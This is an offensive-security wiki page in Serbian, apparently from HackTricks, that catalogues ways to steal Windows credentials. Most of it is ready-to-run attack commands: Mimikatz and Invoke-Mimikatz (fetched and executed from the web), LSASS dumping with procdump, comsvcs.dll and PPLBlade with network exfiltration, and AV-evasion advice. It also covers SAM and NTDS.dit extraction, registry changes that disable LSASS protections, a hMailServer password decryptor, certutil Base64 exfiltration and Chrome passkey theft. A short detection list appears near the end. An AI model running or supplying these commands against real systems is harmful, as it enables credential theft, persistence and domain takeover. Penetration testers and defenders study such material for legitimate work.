# Krađa Windows kredencijala

{{#include ../../banners/hacktricks-training.md}}

## Kredencijali Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Pronađite druge stvari koje Mimikatz može da radi na** [**ovoj stranici**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Saznajte više o nekim mogućim zaštitama kredencijala ovde.**](credentials-protections.md) **Ove zaštite mogu sprečiti Mimikatz da izdvoji neke kredencijale.**

## Kredencijali sa Meterpreterom

Koristite [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **koji** sam napravio da biste **pretražili lozinke i hash-eve** na žrtvinom sistemu.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Zaobilaženje AV-a

### Procdump + Mimikatz

Pošto je **Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**legitiman Microsoft alat**, Defender ga ne detektuje.\
Ovaj alat možete koristiti za **dump lsass procesa**, **preuzimanje dump-a** i **lokalno izdvajanje** **kredencijala** iz dump-a.

Takođe možete koristiti [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Ovaj proces se automatski obavlja pomoću alata [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Napomena**: Neki **AV** mogu **detektovati** korišćenje alata **procdump.exe za dump lsass.exe** kao **maliciozno**, zato što **detektuju** stringove **"procdump.exe" i "lsass.exe"**. Zbog toga je **diskretnije** proslediti **PID** procesa lsass kao **argument** alatu procdump, **umesto** **naziva lsass.exe.**

### Dumping lsass sa **comsvcs.dll**

DLL pod nazivom **comsvcs.dll**, koji se nalazi u `C:\Windows\System32`, odgovoran je za **dump memorije procesa** u slučaju pada sistema. Ovaj DLL sadrži **funkciju** pod nazivom **`MiniDumpW`**, koja je predviđena za pozivanje pomoću alata `rundll32.exe`.\
Nije relevantno kako se koriste prva dva argumenta, ali je treći podeljen na tri komponente. PID procesa koji treba dumpovati predstavlja prvu komponentu, lokacija dump fajla predstavlja drugu, dok je treća komponenta isključivo reč **full**. Ne postoje alternativne opcije.\
Nakon parsiranja ove tri komponente, DLL se koristi za kreiranje dump fajla i prenos memorije navedenog procesa u taj fajl.\
Korišćenje alata **comsvcs.dll** moguće je za dump lsass procesa, čime se eliminiše potreba za uploadovanjem i izvršavanjem alata procdump. Ovaj metod je detaljno opisan na adresi [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

Za izvršavanje se koristi sledeća komanda:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Ovaj proces možete automatizovati pomoću** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping lsass pomoću Task Manager-a**

1. Kliknite desnim tasterom na Task Bar i kliknite na Task Manager
2. Kliknite na More details
3. Na kartici Processes pronađite proces „Local Security Authority Process“
4. Kliknite desnim tasterom na proces „Local Security Authority Process“ i kliknite na „Create dump file“.

### Dumping lsass pomoću procdump-a

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) je Microsoft-ov binarni fajl sa digitalnim potpisom koji je deo [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) paketa.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpovanje lsass procesa pomoću PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) je Tool za dumpovanje Protected Process procesa koji podržava obfuskaciju memory dump-a i njegovo prenošenje na udaljene workstations bez upisivanja na disk.

**Ključne funkcionalnosti**:

1. Zaobilaženje PPL zaštite
2. Obfuskacija memory dump fajlova radi izbegavanja Defender mehanizama za detekciju zasnovanih na signature-ima
3. Upload memory dump-a pomoću RAW i SMB upload metoda, bez upisivanja na disk (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-based LSASS dumping bez MiniDumpWriteDump

Ink Dragon isporučuje dumper u tri faze pod nazivom **LalsDumper**, koji nikada ne poziva `MiniDumpWriteDump`, pa se EDR hooks na tom API-ju nikada ne aktiviraju:

1. **Stage 1 loader (`lals.exe`)** – pretražuje `fdp.dll` u potrazi za placeholder-om koji se sastoji od 32 malih slova `d`, zamenjuje ga apsolutnom putanjom do `rtu.txt`, čuva zakrpenu DLL datoteku kao `nfdp.dll` i poziva `AddSecurityPackageA("nfdp","fdp")`. Time se **LSASS** primorava da učita malicious DLL kao novi Security Support Provider (SSP).
2. **Stage 2 unutar LSASS-a** – kada LSASS učita `nfdp.dll`, DLL čita `rtu.txt`, XOR-uje svaki bajt sa `0x20` i mapira dekodirani blob u memoriju pre prosleđivanja izvršavanja.
3. **Stage 3 dumper** – mapirani payload ponovo implementira MiniDump logiku koristeći **direct syscalls** razrešene iz hash-ovanih API imena (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Poseban export pod nazivom `Tom` otvara `%TEMP%\<pid>.ddt`, upisuje kompresovani LSASS dump u datoteku i zatvara handle, tako da exfiltration može da se obavi kasnije.

Napomene za operatora:

* Držite `lals.exe`, `fdp.dll`, `nfdp.dll` i `rtu.txt` u istom direktorijumu. Stage 1 zamenjuje hard-coded placeholder apsolutnom putanjom do `rtu.txt`, pa razdvajanje ovih datoteka prekida chain.
* Registracija se obavlja dodavanjem `nfdp` u `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Tu vrednost možete sami unapred postaviti kako bi LSASS ponovo učitao SSP pri svakom boot-u.
* `%TEMP%\*.ddt` datoteke su kompresovani dump-ovi. Dekomprimujte ih lokalno, a zatim ih prosledite alatima Mimikatz/Volatility za credential extraction.
* Pokretanje `lals.exe` zahteva admin/SeTcb prava kako bi `AddSecurityPackageA` uspeo; nakon povratka iz poziva, LSASS transparentno učitava rogue SSP i izvršava Stage 2.
* Uklanjanje DLL-a sa diska ne izbacuje ga iz LSASS-a. Ili obrišite registry entry i restartujte LSASS (reboot), ili ga ostavite radi dugoročne persistence.

## CrackMapExec

### Dump SAM hash-eva
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA tajni
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dump NTDS.dit fajla sa ciljnog DC-a
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Izvuci istoriju lozinki iz NTDS.dit datoteke sa ciljnog DC-a
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Prikaži atribut pwdLastSet za svaki nalog iz NTDS.dit datoteke
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Krađa SAM & SYSTEM

Ovi fajlovi bi trebalo da se nalaze u _C:\windows\system32\config\SAM_ i _C:\windows\system32\config\SYSTEM._ Ali **ne možete ih jednostavno kopirati na uobičajen način** jer su zaštićeni.

### Iz Registry-ja

Najlakši način da ukradete ove fajlove jeste da preuzmete njihovu kopiju iz Registry-ja:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Preuzmite** te fajlove na svoju Kali mašinu i **izdvojite hash vrednosti** pomoću:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Možete kopirati zaštićene datoteke koristeći ovu uslugu. Potrebna su vam Administrator prava.

#### Using vssadmin

vssadmin binary je dostupan samo u Windows Server verzijama
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Ali isto možete uraditi iz **Powershell-a**. Ovo je primer **kako da kopirate SAM file** (korišćeni hard disk je „C:“, a fajl se čuva u C:\users\Public), ali ovo možete koristiti za kopiranje bilo kog zaštićenog fajla:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

Na kraju, možete koristiti i [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) da napravite kopiju datoteka SAM, SYSTEM i ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

Datoteka **NTDS.dit** poznata je kao srce sistema **Active Directory** i sadrži ključne podatke o korisničkim objektima, grupama i njihovim članstvima. U njoj se čuvaju **password hashes** korisnika domena. Ova datoteka je baza podataka **Extensible Storage Engine (ESE)** i nalazi se na lokaciji **_%SystemRoom%/NTDS/ntds.dit_**.

U ovoj bazi podataka održavaju se tri primarne tabele:

- **Data Table**: Ova tabela čuva detalje o objektima kao što su korisnici i grupe.
- **Link Table**: Prati odnose, kao što su članstva u grupama.
- **SD Table**: Ovde se čuvaju **security descriptors** za svaki objekat, čime se obezbeđuju sigurnost i kontrola pristupa sačuvanim objektima.

Više informacija o ovome: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows koristi _Ntdsa.dll_ za interakciju sa tom datotekom, a koristi je _lsass.exe_. Zatim se **deo** datoteke **NTDS.dit** može nalaziti **unutar memorije procesa `lsass`** (verovatno možete pronaći najnovije pristupljene podatke zbog poboljšanja performansi korišćenjem **cache** memorije).

#### Dešifrovanje hash vrednosti unutar NTDS.dit

Hash se šifruje 3 puta:

1. Dešifrujte Password Encryption Key (**PEK**) pomoću **BOOTKEY** i **RC4**.
2. Dešifrujte **hash** pomoću **PEK** i **RC4**.
3. Dešifrujte **hash** pomoću **DES**.

**PEK** ima **istu vrednost** na svakom **domain controlleru**, ali je **šifrovan** unutar datoteke **NTDS.dit** pomoću **BOOTKEY** vrednosti iz datoteke **SYSTEM** na domain controlleru (**razlikuje se između domain controller-a**). Zbog toga su vam za preuzimanje credentials iz datoteke NTDS.dit potrebne datoteke NTDS.dit i SYSTEM (_C:\Windows\System32\config\SYSTEM_).

### Kopiranje NTDS.dit pomoću Ntdsutil

Dostupno od Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Možete takođe koristiti trik [**volume shadow copy**](#stealing-sam-and-system) za kopiranje datoteke **ntds.dit**. Imajte na umu da će vam takođe biti potrebna kopija datoteke **SYSTEM** (ponovo, koristite trik [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system)).

### **Izdvajanje hash-eva iz NTDS.dit**

Kada **pribavite** datoteke **NTDS.dit** i **SYSTEM**, možete koristiti alate kao što je _secretsdump.py_ za **izdvajanje hash-eva**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Možete ih takođe **automatski izvući** koristeći validnog domain admin korisnika:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Za **velike NTDS.dit datoteke** preporučuje se njihovo izdvajanje pomoću [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Na kraju, možete koristiti i **Metasploit modul**: _post/windows/gather/credentials/domain_hashdump_ ili **mimikatz** `lsadump::lsa /inject`

### **Izdvajanje objekata domena iz NTDS.dit u SQLite bazu podataka**

NTDS objekti mogu biti izdvojeni u SQLite bazu podataka pomoću alata [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Ne izdvajaju se samo secrets već i čitavi objekti i njihovi atributi radi daljeg izdvajanja informacija kada je raw NTDS.dit datoteka već preuzeta.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
Hive `SYSTEM` je opcioni, ali omogućava dešifrovanje secrets (NT i LM hash-eva, dodatnih kredencijala kao što su cleartext lozinke, Kerberos ili trust ključevi, istorije NT i LM lozinki). Pored drugih informacija, izdvajaju se sledeći podaci: korisnički i mašinski nalozi sa njihovim hash-evima, UAC zastavice, vremenske oznake poslednjeg logovanja i promene lozinke, opisi naloga, imena, UPN, SPN, grupe i rekurzivna članstva, stablo organizational units i članstvo, trusted domains sa tipom trust-a, smerom i atributima...

## Lazagne

Preuzmite binary sa [ovog mesta](https://github.com/AlessandroZ/LaZagne/releases). Ovaj binary možete koristiti za izdvajanje kredencijala iz različitih software-a.
```
lazagne.exe all
```
## Drugi alati za izvlačenje kredencijala iz SAM-a i LSASS-a

### Windows credentials Editor (WCE)

Ovaj alat može da se koristi za izvlačenje kredencijala iz memorije. Preuzmite ga sa: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Izvucite kredencijale iz SAM datoteke
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Izvucite akreditive iz SAM datoteke
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Preuzmite ga sa:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) i samo ga **pokrenite** da bi lozinke bile izvučene.

## Prikupljanje podataka iz neaktivnih RDP sesija i slabljenje bezbednosnih kontrola

Ink Dragon-ov FinalDraft RAT uključuje `DumpRDPHistory` tasker čije su tehnike korisne svakom red-teameru:

### Prikupljanje telemetrije u stilu DumpRDPHistory

* **Odredišta odlaznog RDP-a** – analizirajte svaki korisnički hive na lokaciji `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Svaki podključ čuva naziv servera, `UsernameHint` i vremensku oznaku poslednje izmene. FinalDraft logiku možete reprodukovati pomoću PowerShell-a:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Dokazi o dolaznom RDP-u** – upitajte log `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` za Event ID-jeve **21** (uspešna prijava) i **25** (prekid veze) da biste utvrdili ko je administrirao računar:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Kada utvrdite koji se Domain Admin redovno povezuje, dumpujte LSASS pomoću alata LalsDumper/Mimikatz dok njihova **prekinuta** sesija još postoji. CredSSP + NTLM fallback ostavljaju njihov verifier i tokene u LSASS-u, koji se zatim mogu replay-ovati preko SMB/WinRM-a radi preuzimanja `NTDS.dit` ili uspostavljanja persistence-a na domain controllerima.

### Registry downgrades koje cilja FinalDraft

Isti implant takođe menja nekoliko registry ključeva kako bi krađa credentiala bila jednostavnija:
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Podešavanje `DisableRestrictedAdmin=1` primorava potpunu ponovnu upotrebu kredencijala/ticketa tokom RDP-a, što omogućava pivotiranje u stilu pass-the-hash.
* `LocalAccountTokenFilterPolicy=1` onemogućava UAC filtriranje tokena, tako da lokalni administratori dobijaju neograničene tokene preko mreže.
* `DSRMAdminLogonBehavior=2` omogućava DSRM administratoru prijavljivanje dok je DC aktivan, pružajući napadačima još jedan ugrađeni nalog sa visokim privilegijama.
* `RunAsPPL=0` uklanja LSASS PPL zaštite, čineći pristup memoriji trivijalnim za dumpere kao što je LalsDumper.

## hMailServer database credentials (post-compromise)

hMailServer čuva lozinku svoje baze podataka u `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini`, pod `[Database] Password=`. Vrednost je Blowfish-enkriptovana pomoću statičkog ključa `THIS_KEY_IS_NOT_SECRET`, uz zamene endianness-a 4-bajtnih reči. Koristite hex string iz INI datoteke sa ovim Python snippet-om:
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
Sa lozinkom u čistom tekstu, kopirajte SQL CE bazu podataka da biste izbegli zaključavanje datoteke, učitajte 32-bitni provider i po potrebi izvršite upgrade pre upita za hash vrednosti:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
Kolona `accountpassword` koristi hMailServer hash format (hashcat mode `1421`). Cracking ovih vrednosti može obezbediti ponovo upotrebljive kredencijale za WinRM/SSH pivote.
## Presretanje LSA Logon Callback-a (LsaApLogonUserEx2)

Neki alati hvataju **plaintext lozinke za prijavljivanje** presretanjem LSA logon callback-a `LsaApLogonUserEx2`. Ideja je da se authentication package callback hook-uje ili wrap-uje tako da se kredencijali hvataju **tokom prijavljivanja** (pre hashovanja), a zatim zapisuju na disk ili vraćaju operatoru. Ovo se obično implementira kao helper koji se inject-uje u LSA ili se registruje sa njim, a zatim beleži svaki uspešan interactive/network logon događaj sa korisničkim imenom, domenom i lozinkom.

Operativne napomene:
- Zahteva local admin/SYSTEM privilegije za učitavanje helper-a u authentication path.
- Uhvaćeni kredencijali se pojavljuju samo kada dođe do prijavljivanja (interactive, RDP, service ili network logon, u zavisnosti od hook-a).

## Sačuvani SSMS kredencijali za povezivanje (sqlstudio.bin)

SQL Server Management Studio (SSMS) čuva informacije o sačuvanim konekcijama u fajlu `sqlstudio.bin` za konkretnog korisnika. Namenski dumpers mogu parsirati fajl i oporaviti sačuvane SQL kredencijale. U shell-ovima koji vraćaju samo izlaz komandi, fajl se često eksfiltrira tako što se kodira kao Base64 i ispisuje na stdout.
```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```
Na strani operatora, ponovo izgradite fajl i pokrenite dumper lokalno da biste povratili akreditive:
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## Krađa Passkeys / WebAuthn kredencijala iz Chrome-a na Windows-u

Ako se izvršavanje koda dobije kao **korisnik žrtva** na Windows hostu koji koristi **Chrome + Google Password Manager synced passkeys**, Passkeys postaju zanimljiva meta za post-exploitation, čak i **bez admin/SYSTEM** privilegija.

### Zanimljivi lokalni artefakti
```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```
- **`Sync Data\LevelDB`** skladišti protobuf-enkodirane zapise **`WebauthnCredentialSpecifics`**. Proces istog korisnika može da enumeriše **RP ID**, **username**, **credential ID** i materijal šifrovanog privatnog ključa za sinhronizovane passkeys.
- **`passkey_enclave_state`** skladišti stanje lokalne registracije uređaja, kao što su **`wrapped_identity_private_key`** i wrapped secret koji se koristi za oporavak sinhronizovanih credentiala.

Brza trijaža:
```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
Select-Object FullName, Length, LastWriteTime
```
### TPM-bound key blobs can still be abused as a local signing oracle

Ako browser izveze identitetski ključ podržan TPM-om kao **`NCRYPT_OPAQUE_KEY_BLOB`** i sačuva taj blob u stanju dostupnom korisniku, malware **ne mora** da izvuče sirovi privatni ključ. Može jednostavno ponovo da uveze blob na **istoj mašini** i zatraži od lokalnog TPM-a da potpiše podatke koje kontroliše napadač:
```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```
To znači da **hardversko vezivanje sprečava izvoz van uređaja, ali ne i korišćenje istog korisnika na kompromitovanom endpoint-u**.

### Praktični načini zloupotrebe

1. **Pass-ta-key / relay identiteta uređaja**
- Izlistati `WebauthnCredentialSpecifics` iz Chrome-ovog LevelDB-a.
- Pokrenuti passkey login i dobiti svež WebAuthn challenge.
- Upotrebiti ukradeni `wrapped_identity_private_key` blob na TPM-u žrtve za potpisivanje binding-a cloud-authenticator zahteva.
- Proslediti dobijenu assertion relying party-ju.
- Ovo je naročito korisno kada RP prihvata `userVerification=preferred` ili ne odbacuje assertion-e sa **`UV=0`**.

2. **Preuzimanje pending UV-key-a**
- Prisiliti ponovno onboarding brisanjem `passkey_enclave_state` ili slanjem validne potpisane `device/forget` operacije.
- Ako onboarding ostavi uređaj u stanju **`uv_key_pending`**, registrovati UV javni ključ kojim upravlja napadač.
- Ako provider ne proverava attestation / poreklo iz secure hardware-a za novi UV ključ, kasniji potpisi napadačevog ključa tretiraju se kao **`UV=1`**.

3. **Krađa master-secret-a / SDS-a tokom recovery-ja**
- Prisiliti recovery ili rejoin kako bi Chrome preuzeo master secret za synced-passkey.
- Pratiti ponovno kreiranje/izmene `passkey_enclave_state`, a zatim izvršiti dump Chrome memorije dok se plaintext **security domain secret (SDS)** nalazi u memoriji.
- Upotrebiti pronađeni SDS za dešifrovanje šifrovanih polja u svakom `WebauthnCredentialSpecifics` zapisu i oporavak prenosivih WebAuthn privatnih ključeva.

### DFIR / ideje za detekciju

- Nadzirati **brisanje/ponovno kreiranje** fajla `passkey_enclave_state`.
- Upozoriti na neuobičajen pristup Chrome-ovom **`Sync Data\LevelDB`** direktorijumu iz procesa koji nisu browser.
- Upozoriti na **dump-ove Chrome memorije** ili sumnjiv pristup memoriji između procesa.
- Istražiti ponovljene zahteve za **Google Password Manager recovery PIN** ili neočekivani re-onboarding.
- Imajte na umu da WebAuthn **`signCount`** često nije koristan za synced passkeys jer može ostati konstantan, pa je klasična detekcija klonova nepouzdana.

## Reference

- [Unit 42 – Istraga višegodišnjih neotkrivenih operacija usmerenih na sektore visoke vrednosti](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing preko SMTP-a → dešifrovanje hMailServer credential-a → Veeam CVE-2023-27532 do SYSTEM-a](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [Check Point Research – Inside Ink Dragon: Otkrivanje relay mreže i unutrašnjeg rada prikrivene ofanzivne operacije](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Unit 42 – Pass the Passkey: Nova attack surface u passwordless autentikaciji](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [Microsoft – `NCryptCreatePersistedKey` / CNG key storage](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)

{{#include ../../banners/hacktricks-training.md}}
